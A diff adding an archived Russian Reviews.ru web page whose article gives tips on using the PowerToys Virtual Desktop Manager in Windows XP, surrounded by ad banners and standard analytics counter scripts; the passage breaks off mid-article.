@@ -1,0 +1,1208 @@
+
+
+
+<script language="javascript">
+	function WinOpen(url,x,y) {
+		var options = "toolbar=no,menubar=yes,scrollbars=yes,resizable=yes,width=" + x + ",height=" + y;
+		msgWindow=window.open(url,"WinOpen",options);
+	}
+</script>
+
+
+
+
+
+<html><!-- InstanceBegin template="/Templates/temp.dwt.asp" codeOutsideHTMLIsLocked="false" -->
+<head>
+<meta http-equiv="Content-Type" content="text/html; charset=windows-1251">
+<!-- InstanceBeginEditable name="doctitle" -->
+<title>Полезные советы по организации рабочего стола под Windows XP  - обзоры, тесты, сравнения, советы, описание - Reviews.ru 3.0</title>
+<!-- InstanceEndEditable -->
+<!-- InstanceBeginEditable name="head" -->
+<style type="text/css">
+<!--
+#Layer1 {
+	position:absolute;
+	left:408px;
+	top:1052px;
+	width:313px;
+	height:146px;
+	z-index:1;
+	background-color: #FFFFCC;
+	visibility: visible;
+}
+-->
+</style>
+<script src="../Scripts/AC_RunActiveContent.js" type="text/javascript"></script>
+
+<script type="text/javascript"><!--
+
+
+// Размер шрифтов
+var yandex_ad_fontSize = 1;
+
+// Настройки объявлений Маркета
+var yandex_market_fontColor = '000000';
+var yandex_market_BorderColor = 'E3D8F4';
+var yandex_market_BgColor = 'F5F1FB';
+var yandex_market_headerBgColor = 'E7DDF6';
+var yandex_market_catColor = '666666';
+var yandex_market_offerlinkColor = '0B57AC';
+var yandex_market_linkColor = '0B57AC';
+function yandex_market_print(){ }
+
+var yandex_r = Math.round(Math.random() * 100000);
+document.write('<sc'+'ript type="text/javascript" src="http://an.yandex.ru/code/22315?rnd=' + yandex_r + '&direct-limit=0&market-style=2&market-limit=4"></'+'sc'+'ript>');
+
+
+//--></script>
+
+
+
+<!-- InstanceEndEditable -->
+<link href="../stile.css" rel="stylesheet" type="text/css">
+<SCRIPT LANGUAGE="JavaScript">
+<!--
+
+//  Поменяйте адрес страницы и height-высоту и width-ширину открываемого документа
+function goFile() {
+	gogo = window.open("http://www.reviews.ru/300.htm", "gogo", "height=200,width=250"); self.focus(); 
+}
+// -->
+</SCRIPT>
+<script language="JavaScript" type="text/JavaScript">
+<!--
+
+
+
+function MM_preloadImages() { //v3.0
+  var d=document; if(d.images){ if(!d.MM_p) d.MM_p=new Array();
+    var i,j=d.MM_p.length,a=MM_preloadImages.arguments; for(i=0; i<a.length; i++)
+    if (a[i].indexOf("#")!=0){ d.MM_p[j]=new Image; d.MM_p[j++].src=a[i];}}
+}
+//-->
+</script>
+
+<script src="../Scripts/AC_RunActiveContent.js" type="text/javascript"></script>
+<style type="text/css">
+<!--
+.style1 {color: #FFFFFF}
+-->
+</style>
+</head>
+
+<body bgcolor="#F2F2F2" leftmargin="0" topmargin="0" marginwidth="0" marginheight="0">
+
+
+
+<table  border="0" align="center" cellpadding="0" cellspacing="0">
+      <tr>
+        
+        <td rowspan="5" valign="top"><table border="0" cellpadding="0" cellspacing="0" bgcolor="#FFFFFF" height="100%">
+          <tr>
+            <td colspan="3">
+			
+			
+			
+			<table width="100%"  border="0" cellspacing="0" cellpadding="0">
+              <tr>
+                <td width="210" background="../images/new_top_2/t_bg_1.jpg"><a href="http://www.reviews.ru/index.asp"><img src="../images/new_top/2/1.jpg" width="210" height="106" border="0"></a></td>
+                <td align="center" valign="top" background="../images/new_top/t_bg_1.jpg"><table width="100%"  border="0" cellpadding="0" cellspacing="0">
+                    <tr>
+                      <td height="30">&nbsp;</td>
+                    </tr>
+                    <tr>
+                      <td align="right">
+                          <font color="#FFFFFF" size="5" face="Verdana, Arial, Helvetica, sans-serif"><b>2773</b><br />
+                        </font><font color="#FFFFFF">всего статей</font> </td>
+                    </tr>
+                    <tr>
+                      <td height="7"></td>
+                    </tr>
+                </table></td>
+                <td align="right" background="../images/new_top/t_bg_1.jpg"><object classid="clsid:D27CDB6E-AE6D-11cf-96B8-444553540000" codebase="http://download.macromedia.com/pub/shockwave/cabs/flash/swflash.cab#version=7,0,19,0" width="555" height="106">
+                  <param name="movie" value="../images/new_top/2/3.swf">
+                  <param name="quality" value="high">
+                  <embed src="../images/new_top/2/3.swf" quality="high" pluginspage="http://www.macromedia.com/go/getflashplayer" type="application/x-shockwave-flash" width="555" height="106"></embed>
+                </object></td>
+              </tr>
+              <tr>
+                <td width="210"><img src="../images/new_top/2/2.jpg" width="210" height="29"></td>
+                <td align="center" bgcolor="#030200">&nbsp;</td>
+                <td align="center" background="../images/new_top/top_logo1.jpg"><table width="100%" border="0" cellspacing="0" cellpadding="0">
+                    <tr>
+                      <td align="right" bgcolor="#000000"><img src="../images/new_top/kvadratiki.gif" width="227" height="29"></td>
+                      <td width="298" background="../images/new_top/top4.jpg" align="center" valign="middle"><a href="../about.asp" class="black"><strong>о проекте</strong></a> |<strong> <a href="../adv.asp" class="black">реклама</a> </strong>|<strong> <a href="mailto:info@reviews.ru" class="black">e-mail</a> </strong>|<strong> <a href="../service/index.asp" class="black">вход</a></strong> </td>
+                    </tr>
+                </table></td>
+              </tr>
+            </table></td>
+            <td bgcolor="#000000" rowspan="10"><img src="../images/spacer.gif" border="0" width="1" height="1" alt="" /></td>
+          </tr>
+          <tr>
+            <td colspan="3" background="../images/search_back1.gif" bgcolor="#97120D"><table border="0" cellpadding="0" cellspacing="0">
+                <tr>
+                  <td background="../images/b1_1.gif"><table width="100%"  border="0" cellspacing="0" cellpadding="0">
+                      <tr>
+                        <td><img src="../images/b1.gif" width="33" height="39" /></td>
+                        <td nowrap="nowrap"><strong><a href="../index.asp" class="red">на главную</a> </strong></td>
+                        <td><img src="../images/b1.gif" width="33" height="39" /></td>
+                        <td nowrap="nowrap"><strong><a href="../price/index.asp" class="red">сравнение цен </a></strong></td>
+                        <td><img src="../images/b1.gif" width="33" height="39" /></td>
+                        <td nowrap="nowrap"><strong><a href="../art.asp" class="red">как разместить статью? </a></strong></td>
+                        <td><img src="../images/b1.gif" width="33" height="39" /></td>
+                        <td nowrap="nowrap"><strong><a href="../pr.asp" class="red">как разместить прайс-лист?</a></strong></td>
+                        <td>&nbsp;</td>
+                        <td>&nbsp;</td>
+                        <td>&nbsp;</td>
+                        <td>&nbsp;</td>
+                        <td>&nbsp;</td>
+                        <td nowrap="nowrap">&nbsp;</td>
+                      </tr>
+                  </table></td>
+                  <td background="../images/search_back1.gif" width="43" height="39" valign="top" ><img src="../images/search_back.gif" width="43" height="39" /></td>
+                  <td valign="middle" nowrap="nowrap" background="../images/search_back1.gif" style="padding-top:12"></td>
+                </tr>
+            </table></td>
+          </tr>
+          <tr>
+            <td valign="top" bgcolor="#000000"><table width="100%"  border="0" cellspacing="0" cellpadding="5">
+                <tr>
+                  <td align="center"><object classid="clsid:D27CDB6E-AE6D-11cf-96B8-444553540000" codebase="http://download.macromedia.com/pub/shockwave/cabs/flash/swflash.cab#version=7,0,19,0" width="200" height="350">
+  <param name="movie" value="http://www.reviews.ru/images/banners/l1/200x350.swf" />
+  <param name="quality" value="high" />
+  <embed src="http://www.reviews.ru/images/banners/l1/200x350.swf" quality="high" pluginspage="http://www.macromedia.com/go/getflashplayer" type="application/x-shockwave-flash" width="200" height="350"></embed>
+</object></td>
+                </tr>
+                <tr>
+                  <td height="15" align="center">&nbsp;</td>
+                </tr>
+                <tr>
+                  <td>
+
+
+
+<table width="100%"  border="0" cellspacing="0" cellpadding="3">
+  
+  <tr>
+    <td width="20"><img src="http://www.reviews.ru/images/button2.gif" width="20" height="20"></td>
+    <td><a href="http://www.reviews.ru/razdel/razdel.asp?id=30 " class="white"><strong>Интернет-телефония</strong></a></td>
+  </tr>
+  
+  <tr>
+    <td width="20"><img src="http://www.reviews.ru/images/button2.gif" width="20" height="20"></td>
+    <td><a href="http://www.reviews.ru/razdel/razdel.asp?id=26 " class="white"><strong>Телефоны и факсы</strong></a></td>
+  </tr>
+  
+  <tr>
+    <td width="20"><img src="http://www.reviews.ru/images/button2.gif" width="20" height="20"></td>
+    <td><a href="http://www.reviews.ru/razdel/razdel.asp?id=4 " class="white"><strong>DVD, MP3, MPEG4, Аудио-Видео</strong></a></td>
+  </tr>
+  
+  <tr>
+    <td width="20"><img src="http://www.reviews.ru/images/button2.gif" width="20" height="20"></td>
+    <td><a href="http://www.reviews.ru/razdel/razdel.asp?id=1 " class="white"><strong>Компьютеры и серверы</strong></a></td>
+  </tr>
+  
+  <tr>
+    <td width="20"><img src="http://www.reviews.ru/images/button2.gif" width="20" height="20"></td>
+    <td><a href="http://www.reviews.ru/razdel/razdel.asp?id=2 " class="white"><strong>Ноутбуки и КПК</strong></a></td>
+  </tr>
+  
+  <tr>
+    <td width="20"><img src="http://www.reviews.ru/images/button2.gif" width="20" height="20"></td>
+    <td><a href="http://www.reviews.ru/razdel/razdel.asp?id=20 " class="white"><strong>Цифровое фото-видео</strong></a></td>
+  </tr>
+  
+  <tr>
+    <td width="20"><img src="http://www.reviews.ru/images/button2.gif" width="20" height="20"></td>
+    <td><a href="http://www.reviews.ru/razdel/razdel.asp?id=5 " class="white"><strong>Процессоры</strong></a></td>
+  </tr>
+  
+  <tr>
+    <td width="20"><img src="http://www.reviews.ru/images/button2.gif" width="20" height="20"></td>
+    <td><a href="http://www.reviews.ru/razdel/razdel.asp?id=6 " class="white"><strong>Системные платы</strong></a></td>
+  </tr>
+  
+  <tr>
+    <td width="20"><img src="http://www.reviews.ru/images/button2.gif" width="20" height="20"></td>
+    <td><a href="http://www.reviews.ru/razdel/razdel.asp?id=7 " class="white"><strong>Память</strong></a></td>
+  </tr>
+  
+  <tr>
+    <td width="20"><img src="http://www.reviews.ru/images/button2.gif" width="20" height="20"></td>
+    <td><a href="http://www.reviews.ru/razdel/razdel.asp?id=8 " class="white"><strong>Видеокарты и TV/FM тюнеры</strong></a></td>
+  </tr>
+  
+  <tr>
+    <td width="20"><img src="http://www.reviews.ru/images/button2.gif" width="20" height="20"></td>
+    <td><a href="http://www.reviews.ru/razdel/razdel.asp?id=16 " class="white"><strong>Накопители информации</strong></a></td>
+  </tr>
+  
+  <tr>
+    <td width="20"><img src="http://www.reviews.ru/images/button2.gif" width="20" height="20"></td>
+    <td><a href="http://www.reviews.ru/razdel/razdel.asp?id=9 " class="white"><strong>Звуковые карты и акустика</strong></a></td>
+  </tr>
+  
+  <tr>
+    <td width="20"><img src="http://www.reviews.ru/images/button2.gif" width="20" height="20"></td>
+    <td><a href="http://www.reviews.ru/razdel/razdel.asp?id=10 " class="white"><strong>Контроллеры и кабели</strong></a></td>
+  </tr>
+  
+  <tr>
+    <td width="20"><img src="http://www.reviews.ru/images/button2.gif" width="20" height="20"></td>
+    <td><a href="http://www.reviews.ru/razdel/razdel.asp?id=21 " class="white"><strong>Wi-Fi, ADSL, Сети</strong></a></td>
+  </tr>
+  
+  <tr>
+    <td width="20"><img src="http://www.reviews.ru/images/button2.gif" width="20" height="20"></td>
+    <td><a href="http://www.reviews.ru/razdel/razdel.asp?id=11 " class="white"><strong>Корпуса и  питание</strong></a></td>
+  </tr>
+  
+  <tr>
+    <td width="20"><img src="http://www.reviews.ru/images/button2.gif" width="20" height="20"></td>
+    <td><a href="http://www.reviews.ru/razdel/razdel.asp?id=12 " class="white"><strong>Системы охлаждения </strong></a></td>
+  </tr>
+  
+  <tr>
+    <td width="20"><img src="http://www.reviews.ru/images/button2.gif" width="20" height="20"></td>
+    <td><a href="http://www.reviews.ru/razdel/razdel.asp?id=13 " class="white"><strong>Мониторы</strong></a></td>
+  </tr>
+  
+  <tr>
+    <td width="20"><img src="http://www.reviews.ru/images/button2.gif" width="20" height="20"></td>
+    <td><a href="http://www.reviews.ru/razdel/razdel.asp?id=14 " class="white"><strong>Принтеры и плоттеры</strong></a></td>
+  </tr>
+  
+  <tr>
+    <td width="20"><img src="http://www.reviews.ru/images/button2.gif" width="20" height="20"></td>
+    <td><a href="http://www.reviews.ru/razdel/razdel.asp?id=15 " class="white"><strong>Сканеры</strong></a></td>
+  </tr>
+  
+  <tr>
+    <td width="20"><img src="http://www.reviews.ru/images/button2.gif" width="20" height="20"></td>
+    <td><a href="http://www.reviews.ru/razdel/razdel.asp?id=18 " class="white"><strong>Устройства ввода</strong></a></td>
+  </tr>
+  
+  <tr>
+    <td width="20"><img src="http://www.reviews.ru/images/button2.gif" width="20" height="20"></td>
+    <td><a href="http://www.reviews.ru/razdel/razdel.asp?id=17 " class="white"><strong>Расходные материалы</strong></a></td>
+  </tr>
+  
+  <tr>
+    <td width="20"><img src="http://www.reviews.ru/images/button2.gif" width="20" height="20"></td>
+    <td><a href="http://www.reviews.ru/razdel/razdel.asp?id=29 " class="white"><strong>Аксессуары</strong></a></td>
+  </tr>
+  
+  <tr>
+    <td width="20"><img src="http://www.reviews.ru/images/button2.gif" width="20" height="20"></td>
+    <td><a href="http://www.reviews.ru/razdel/razdel.asp?id=22 " class="white"><strong>Софт</strong></a></td>
+  </tr>
+  
+  <tr>
+    <td width="20"><img src="http://www.reviews.ru/images/button2.gif" width="20" height="20"></td>
+    <td><a href="http://www.reviews.ru/razdel/razdel.asp?id=23 " class="white"><strong>Копировальные аппараты</strong></a></td>
+  </tr>
+  
+  <tr>
+    <td width="20"><img src="http://www.reviews.ru/images/button2.gif" width="20" height="20"></td>
+    <td><a href="http://www.reviews.ru/razdel/razdel.asp?id=24 " class="white"><strong>Оборудование для презентаций</strong></a></td>
+  </tr>
+  
+  <tr>
+    <td width="20"><img src="http://www.reviews.ru/images/button2.gif" width="20" height="20"></td>
+    <td><a href="http://www.reviews.ru/razdel/razdel.asp?id=25 " class="white"><strong>Офисная техника</strong></a></td>
+  </tr>
+  
+  <tr>
+    <td width="20"><img src="http://www.reviews.ru/images/button2.gif" width="20" height="20"></td>
+    <td><a href="http://www.reviews.ru/razdel/razdel.asp?id=28 " class="white"><strong>Торговое оборудование</strong></a></td>
+  </tr>
+  
+  <tr>
+    <td width="20"><img src="http://www.reviews.ru/images/button2.gif" width="20" height="20"></td>
+    <td><a href="http://www.reviews.ru/razdel/razdel.asp?id=27 " class="white"><strong>Системы безопасности</strong></a></td>
+  </tr>
+  
+
+</table>
+
+</td>
+                </tr>
+                <tr>
+                  <td align="center"><hr size="1" color="#FFFFFF" /></td>
+                </tr>
+                <tr>
+                  <td align="center"><object classid="clsid:D27CDB6E-AE6D-11cf-96B8-444553540000" codebase="http://download.macromedia.com/pub/shockwave/cabs/flash/swflash.cab#version=7,0,19,0" width="200" height="350">
+    <param name="movie" value="http://www.reviews.ru/images/banners/compro/Reviews.swf" />
+    <param name="quality" value="high" />
+    <embed src="http://www.reviews.ru/images/banners/compro/Reviews.swf" quality="high" pluginspage="http://www.macromedia.com/go/getflashplayer" type="application/x-shockwave-flash" width="200" height="350"></embed>
+  </object></td>
+                </tr>
+                <tr>
+                  <td align="center"><hr size="1" color="#FFFFFF" /></td>
+                </tr>
+                <tr>
+                  <td><!-- InstanceBeginEditable name="ban" -->
+                  
+                   <i></i><script>
+var p___1='K__p://ar_#7Kos_#ru/clk#plx?iid=77&amp;id=';
+function clk(v,t)
+{
+var tmp__=p___1.replace(/K/g,"h");tmp__=tmp__.replace(/_/g,"t");tmp__=tmp__.replace(/#/g,".");var k=tmp__+v+"&amp;t=";
+if(t) window.open(k,''); else window.location=k;
+return false;
+}
+</script><style>a.bsr {text-decoration:none; color:white};a.bsr:hover {color:white}</style>
+<table align="center" cellpadding=5 cellspacing=0 bgcolor="#000000" style="width: 200px;height:300px;">
+<tr>
+<td align="center" valign="middle"><a style="text-decoration: none; font: 8pt Tahoma;" href="#" onclick="return clk(53)" onmouseover="window.status='';return true" onmouseout="window.status='';return true"><img src="http://art.7host.ru/ls/polymedia/plazma.jpg" border="0" width="150" height="92"></a>
+<tr><td align="left" valign="middle" style="padding-left:25px;"><span style="font: 8pt tahoma; font-weight: bold; color:#000000;"><a class="bsr" href="#" onClick="return clk(53);" onMouseOver="status='';return true" onMouseOut="status='';return true"><img src="http://www.reviews.ru/images/button2.gif" width="20" height="20" style="vertical-align:bottom;" border="0">Плазменные панели<br/>
+<img src="http://www.reviews.ru/images/button2.gif" width="20" height="20" style="vertical-align:bottom;" border="0">Оверхед-проекторы<br/><img src="http://www.reviews.ru/images/button2.gif" width="20" height="20" style="vertical-align:bottom;" border="0">Слайд-проекторы<br/><img src="http://www.reviews.ru/images/button2.gif" width="20" height="20" style="vertical-align:bottom;" border="0">Документ-камеры<br/><img src="http://www.reviews.ru/images/button2.gif" width="20" height="20" style="vertical-align:bottom;" border="0">Аудиооборудование<br/><img src="http://www.reviews.ru/images/button2.gif" width="20" height="20" style="vertical-align:bottom;" border="0">Проекторы<br/><img src="http://www.reviews.ru/images/button2.gif" width="20" height="20" style="vertical-align:bottom;" border="0">Экраны</a><br/><br/>
+</span>
+</td></tr></table>
+                  <!-- InstanceEndEditable --></td>
+                </tr>
+                <tr>
+                  <td></td>
+                </tr>
+                <tr>
+                  <td><!-- InstanceBeginEditable name="count" -->ZZ
+			  
+			  <!--begin of Top100-->
+                    <a href="http://top100.rambler.ru/top100/"><img src="http://counter.rambler.ru/top100.cnt?344253" alt="Rambler's Top100" width=1 height=1 border=0></a> 
+                    <!--end of Top100 code-->
+                    <!-- SpyLOG f:0210 -->
+                    <script language="javascript"><!--
+Mu="u3015.53.spylog.com";Md=document;Mnv=navigator;Mp=1;
+Mn=(Mnv.appName.substring(0,2)=="Mi")?0:1;Mrn=Math.random();
+Mt=(new Date()).getTimezoneOffset();
+Mz="p="+Mp+"&rn="+Mrn+"&tl=0&ls=0&ln=0&t="+Mt;
+My="";
+My+="<img src='http://"+Mu+"/cnt?cid=301553&"+Mz+"&r="+escape(Md.referrer)+"&pg="+escape(window.location.href)+"' border=0  width=1 height=1  alt='SpyLOG'>";
+Md.write(My);//--></script>
+                    <noscript>
+                    <img src="http://u3015.53.spylog.com/cnt?cid=301553&p=1" alt='SpyLOG' border='0'  width=1 height=1 > 
+                    </noscript>
+                    <!-- SpyLOG  -->
+                    <!--Rating@Mail.ru COUNTER-->
+                    <script language="JavaScript"><!--
+d=document;a='';a+=';r='+escape(d.referrer)
+js=10//--></script>
+                    <script language="JavaScript1.1"><!--
+a+=';j='+navigator.javaEnabled()
+js=11//--></script>
+                    <script language="JavaScript1.2"><!--
+s=screen;a+=';s='+s.width+'*'+s.height
+a+=';d='+(s.colorDepth?s.colorDepth:s.pixelDepth)
+js=12//--></script>
+                    <script language="JavaScript1.3"><!--
+js=13//--></script>
+                    <script language="JavaScript"><!--
+d.write('<img src="http://top.list.ru/counter'+
+'?id=243355;js='+js+a+';rand='+Math.random()+
+'" height=1 width=1>')
+if(js>11)d.write('<'+'!-- ')//--></script>
+                    <noscript>
+                    <img
+src="http://top.list.ru/counter?js=na;id=243355"
+height=1 width=1 alt=""> 
+                    </noscript>
+                    <script language="JavaScript"><!--
+if(js>11)d.write('--'+'>')//--></script>
+                    <!--/COUNTER-->
+                    <!--RAX counter-->
+                    <script language="JavaScript"><!--
+document.write('<img src="http://counter.yadro.ru/hit?r'+
+escape(document.referrer)+((typeof(screen)=='undefined')?'':
+';s'+screen.width+'*'+screen.height+'*'+(screen.colorDepth?
+screen.colorDepth:screen.pixelDepth))+';'+Math.random()+
+'" height=1 width=1 alt="">')//--></script>
+                    <!--/RAX-->
+                    
+                  <table border="0" align="center" cellpadding="0" cellspacing="0">
+                    <tr> 
+                      <td align="center" valign="top"> <script language="javascript"><!--
+Mrn=Math.random();Mz="";
+My="<a href='http://u3015.53.spylog.com/cnt?cid=301553&f=3&rn="+Mrn+"' target='_blank'><img  src='http://u3015.53.spylog.com/cnt?cid=301553&";
+My+="p=1&f=4&rn="+Mrn+Mz+"' border=0  width=88 height=31   alt='SpyLOG'  style=filter:alpha(opacity=20)> </a>";Md.write(My); 
+//--></script> <noscript>
+                        <a href="http://u3015.53.spylog.com/cnt?cid=301553&f=3&p=1" target="_blank"> 
+                        <img style="filter:alpha(opacity=10)" src="http://u3015.53.spylog.com/cnt?cid=301553&p=1&f=4" alt='SpyLOG' border='0'  width=88 height=31 ></a> 
+                        </noscript>                      </td>
+                    </tr>
+                    <tr>
+                      <td align="center" valign="top"><!--Rating@Mail.ru LOGO-->
+                        <a target=_top
+href="http://top.mail.ru/jump?from=243355"><img  style="filter:alpha(opacity=30)" src="http://top.list.ru/counter?id=243355;t=47;l=1" border=0 height=31 width=88 alt="???????@Mail.ru"></a> 
+                        <!--/LOGO--></td>
+                    </tr>
+                    <tr>
+                      <td align="center" valign="top">   <!--RAX logo-->
+                        <a href="http://www.rax.ru/click"><img style="filter:alpha(opacity=20)" src="http://counter.yadro.ru/logo?1.1" border=0 alt="rax.ru: ???????? ????? ????? ?? 24 ????, ??????????? ?? 24 ???? ? ?? ???????" width=88 height=31></a> 
+                        <!--/RAX--></td>
+                    </tr>
+                    <tr>
+                      <td align="center" valign="top"><!--begin of Top100 logo-->
+                        <a href="http://top100.rambler.ru/top100/"><img style="filter:alpha(opacity=20)" src="http://top100-images.rambler.ru/top100/banner-88x31-rambler-gray2.gif" alt="Rambler's Top100" width=88 height=31 border=0 ></a> 
+                        <!--end of Top100 logo --></td>
+                    </tr>
+                    <tr>
+                      <td align="center" valign="top">                        <!-- HotLog -->
+                        <script language="javascript">
+hotlog_js="1.0";hotlog_d=document; hotlog_n=navigator;hotlog_rn=Math.random();
+hotlog_n_n=(hotlog_n.appName.substring(0,3)=="Mic")?0:1;
+hotlog_r=""+hotlog_rn+"&s=24945&im=131&r="+escape(hotlog_d.referrer)+"&pg="+
+escape(window.location.href);
+hotlog_d.cookie="hotlog=1"; hotlog_r+="&c="+(hotlog_d.cookie?"Y":"N");
+hotlog_d.cookie="hotlog=1; expires=Thu, 01-Jan-70 00:00:01 GMT"</script> <script language="javascript1.1">
+hotlog_js="1.1";hotlog_r+="&j="+(navigator.javaEnabled()?"Y":"N")</script> <script language="javascript1.2">
+hotlog_js="1.2";hotlog_s=screen;
+hotlog_r+="&wh="+hotlog_s.width+'x'+hotlog_s.height+"&px="+((hotlog_n_n==0)?
+hotlog_s.colorDepth:hotlog_s.pixelDepth)</script> <script language="javascript1.3">hotlog_js="1.3"</script> 
+                        <script language="javascript">hotlog_r+="&js="+hotlog_js;
+
+hotlog_d.write("<a href=http://click.hotlog.ru/?24945 target=_top><img "+
+"src=\"http://hit2.hotlog.ru/cgi-bin/hotlog/count?"+
+hotlog_r+"&\" border=0 width=88 height=31 align=absmiddle alt=HotLog style=filter:alpha(opacity=30)></a>")
+
+</script> <noscript>
+                        <a href=http://click.hotlog.ru/?24945 target=_top><img style="filter:alpha(opacity=50)"  src="http://hit2.hotlog.ru/cgi-bin/hotlog/count?s=24945&im=131"  border=0  width="88" height="31" alt="HotLog"></a></noscript> 
+                        <!-- /HotLog --></td>
+                    </tr>
+                    <tr>
+                      <td align="center" valign="top">&nbsp;</td>
+                    </tr>
+                  </table>
+			  
+			  <!-- InstanceEndEditable --></td>
+                </tr>
+                <tr>
+                  <td align="center"><!-- UpTime Button Srart -->
+                      <noindex>
+                        <p><a href='http://uptime.ru/downtime.php?host_id=397'><img src="http://uptime.ru/but.php?t=2&amp;i=397" width="88" height="31" border="0" alt='Мониторинг сервера осуществляется системой UpTime' style="filter:alpha(opacity=20)" /></a> </p>
+                      </noindex>
+                      <!-- UpTime Button End -->
+                  </td>
+                </tr>
+            </table></td>
+            <td width="600" height="100%" valign="top"><table width="100%" height="100%"  border="0" cellpadding="0" cellspacing="0">
+                <tr>
+                  <td valign="top"><!-- InstanceBeginEditable name="main" -->
+            <p>
+            <table width="100%"  border="0" align="center" cellpadding="0" cellspacing="0">
+              <tr>
+                <td bgcolor="#FFFFFF"><table width="100%"  border="0" cellspacing="0" cellpadding="7">
+                  
+                  <tr>
+                    <td height="5"><hr noshade color="#FF9900"></td>
+                  </tr>
+                </table>                  
+                  <table width="100%"  border="0" cellspacing="0" cellpadding="7">
+                    <tr>
+                      <td align="center"><p>
+                        <object classid="clsid:D27CDB6E-AE6D-11cf-96B8-444553540000" codebase="http://download.macromedia.com/pub/shockwave/cabs/flash/swflash.cab#version=7,0,19,0" width="600" height="60">
+    <param name="movie" value="../images/banners/beholder/6XX/600x60_.swf">
+    <param name="quality" value="high">
+    <embed src="../images/banners/beholder/6XX/600x60_.swf" quality="high" pluginspage="http://www.macromedia.com/go/getflashplayer" type="application/x-shockwave-flash" width="600" height="60"></embed>
+  </object>
+                      </td>
+                    </tr>
+                    <tr>
+                      <td><hr noshade color="#FF9900"></td>
+                    </tr>
+                    <tr>
+                      <td>
+
+<table width="100%"  border="0" cellspacing="0" cellpadding="0">
+  <tr>
+    <td><table width="600"  border="0" cellspacing="0" cellpadding="3">
+    
+      <tr>
+          <td align="right" valign="top" nowrap><strong><font color="#990000">Сравнить цены: </font></strong></td>
+          <td width="99%">
+		    
+		  
+		    <a href="../price/price_out.asp?idpr=132&id=22">Операционные сис</a> |
+		  
+		  
+		  
+		  
+		    <a href="../price/price_out.asp?idpr=133&id=22">Бухгалтерские пр</a> |
+		  
+		  
+		  
+		  
+		    <a href="../price/price_out.asp?idpr=134&id=22">Офисные программ</a> |
+		  
+		  
+		  
+		  
+		    <a href="../price/price_out.asp?idpr=135&id=22">Прикладное ПО   </a> |
+		  
+		  
+		  
+		  
+		    <a href="../price/price_out.asp?idpr=136&id=22">Мультимедиа и иг</a> |
+		  
+		  
+		  
+		  
+		  </td>
+      </tr>
+      
+
+        </table></td>
+  </tr>
+ 
+</table>
+
+</td>
+                    </tr>
+                    <tr>
+                      <td><!-- Баннер Pregrad.net --></td>
+                    </tr>
+                  </table>
+                  <table width="100%"  border="0" cellspacing="0" cellpadding="5">
+                    <tr>
+                      <td><table width="100%" height="10" border="0" cellpadding="3" cellspacing="0">
+                        <tr>
+                          <td align="center" bgcolor="#FFFFFF"><a href="http://pinnaclesys.ru/consumer.php?id=3496" target="_blank"><img src="../images/banners/pinnacle/studio11_600x90.gif" width="600" height="90" border="0"></a></td>
+                        </tr>
+                        <tr>
+                          <td align="center" bgcolor="#FFFFFF"><table width="100%" height="10" border="0" cellpadding="3" cellspacing="0">
+                            <tr>
+                              <td bgcolor="#E6E6E6">
+                              
+                              <!-- Вставьте эту строчку туда, где планируется показывать рекламный блок Яндекс.Маркета -->
+<script type="text/javascript">yandex_market_print()</script>    
+                              
+                              </td>
+                            </tr>
+                          </table></td>
+                        </tr>
+                      </table></td>
+                    </tr>
+                    <tr>
+                      <td><table width="100%"  border="0" cellspacing="0" cellpadding="0">
+                        <tr>
+                          <td valign="top"><table width="100%" border="0" cellpadding="5" cellspacing="0" bgcolor="#FFFFFF">
+                              <tr>
+                                <td><font color="#97120D" size="5" face="Verdana, Arial, Helvetica, sans-serif">Полезные советы по организации рабочего стола под Windows XP</font></td>
+                              </tr>
+                            </table>
+                              <p>Дата: 28.04.2002 | Автор: Reviews.ru | Число прочтений: 15054</p>
+                              </td>
+                          <td width="1" valign="top">&nbsp;</td>
+                          <td width="150" align="right" valign="top">
+						  
+						  <table width="100%" border="0" cellspacing="0" cellpadding="3">
+  <tr>
+    <td><img src="../images/print.gif" width="22" height="20"></td>
+    <td><a href="javascript:WinOpen('printart.asp?id=410','710','550');">Версия для печати </a></td>
+  </tr>
+  <tr>
+    <td><img src="../images/mail.gif" width="19" height="15"></td>
+    <td><a href="javascript:WinOpen('mailform.asp?id=410','500','550');">Отправить по e-mail </a></td>
+  </tr>
+  <tr>
+    <td>&nbsp;</td>
+    <td>&nbsp;</td>
+  </tr>
+</table>
+
+						  
+						  </td></tr>
+                      </table></td>
+                    </tr>
+                    <tr>
+                      <td><table width="100%" height="10" border="0" cellpadding="3" cellspacing="0">
+                        <tr>
+                          <td bgcolor="#FFFFFF"><table width="100%" height="10" border="0" cellpadding="3" cellspacing="0">
+                            <tr>
+                              <td bgcolor="#E6E6E6"></td>
+                            </tr>
+                          </table></td>
+                        </tr>
+                        <tr>
+                          <td bgcolor="#FFFFFF">
+						  
+						<object classid="clsid:D27CDB6E-AE6D-11cf-96B8-444553540000" codebase="http://download.macromedia.com/pub/shockwave/cabs/flash/swflash.cab#version=9,0,28,0" width="600" height="90">
+    <param name="movie" value="http://www.reviews.ru/images/banners/aver/REVIEWS_10_lopuh.swf" />
+    <param name="quality" value="high" />
+    <embed src="http://www.reviews.ru/images/banners/aver/REVIEWS_10_lopuh.swf" quality="high" pluginspage="http://www.adobe.com/shockwave/download/download.cgi?P1_Prod_Version=ShockwaveFlash" type="application/x-shockwave-flash" width="600" height="90"></embed>
+  </object>			  </td>
+                        </tr>
+                      </table></td>
+                    </tr>
+                    <tr>
+                      <td class="text2_j">
+<p>Если Вы одновременно работаете с несколькими открытыми окнами, мы рекомендуем 
+  воспользоваться утилитой Virtual Desktop Manager входящей в состав пакета <a href="http://www.microsoft.com/windowsxp/pro/downloads/powertoys.asp">Powertoys 
+  для Windows XP</a> (<a href="soft/vdm/PowerToysXP.zip">Download</a> ~970KB). 
+  Эта утилита позволяет использовать до четырех рабочих столов, переключение между 
+  которыми происходит с помощью сочетания «Горячих клавиш» или с помощью кнопок 
+  быстрого переключения расположенных в области задач. Для активизации Virtual 
+  Desktop Manager необходимо открыть контекстное меню в панели задач, кликнув 
+  правой кнопкой и выбрать раздел «Панели инструментов» где необходимо активизировать 
+  «Desktop Manager».</p>
+<p align="center"> <img src="soft/vdm/image001.gif" width="504" height="276"></p>
+<p>После этого в панели задач появится следующие управляющие кнопки.</p>
+<p align="center"> <img src="soft/vdm/image002.gif" width="386" height="142"></p>
+<p>Где первый значок, является кнопкой к быстрому открытию макета всех рабочих 
+  столов. </p>
+<p align="center"> <img src="soft/vdm/image003.gif" width="500" height="375"></p>
+<p>Нажатие мышкой на нужном экране приводит к открытию соответствующего рабочего 
+  стола. Открытие окна может сопровождаться анимацией, однако, мы отключили ее 
